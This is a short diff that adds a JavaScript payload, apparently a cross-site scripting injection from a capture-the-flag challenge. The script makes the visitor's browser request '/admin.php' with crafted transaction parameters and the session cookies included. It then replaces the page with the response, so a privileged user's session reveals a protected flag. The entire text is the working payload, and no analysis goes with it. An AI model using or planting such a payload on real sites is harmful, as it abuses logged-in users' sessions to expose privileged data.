@@ -1,0 +1,5 @@
+<script>
+fetch('/admin.php?transactions[0][amount]=1&transactions[0][country]=FLAG',{credentials:'include'})
+  .then(r => r.text())
+  .then(t => document.body.innerText = t)
+</script>
